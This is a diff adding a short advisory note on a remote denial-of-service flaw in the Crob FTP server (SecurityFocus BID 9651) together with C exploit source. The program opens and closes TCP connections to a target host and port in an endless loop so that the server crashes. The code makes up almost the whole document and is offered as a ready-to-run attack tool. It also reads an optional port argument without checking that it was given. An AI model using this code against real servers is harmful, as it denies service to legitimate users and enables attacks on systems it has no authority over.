@@ -1,0 +1,45 @@
+source: http://www.securityfocus.com/bid/9651/info
+
+It has been reported that the Crob FTP server is prone to a remote denial of service vulnerability. An attacker may exploit this issue to cause the affected server to crash, denying service to legitimate users.
+
+/******************************/
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+int main(int argc, char *argv[])
+{
+
+  int s;
+  struct sockaddr_in target;
+
+  if(argc < 2)
+    {
+      printf("Usage: %s HOST [PORT]\n\n",argv[0]);
+      return 0;
+    }
+
+        do
+	  {
+	    s = socket(AF_INET, SOCK_STREAM, 0);
+	    target.sin_family = AF_INET;
+	    target.sin_port = htons(atoi(argv[2]));
+	    target.sin_addr.s_addr = inet_addr(argv[1]);
+
+	    printf("-       connecting...\n");
+
+	    if( connect(s,(struct sockaddr*)&target, sizeof(struct sockaddr))<0)
+	      {
+                printf("        connect() error!\n\n");
+                exit(-1);
+	      }
+
+	    printf("        connected\n");
+	    printf("        closing connection\n");
+	    close(s);
+	  }
+        while(1);
+        return 0;
+}
+/*******************************/
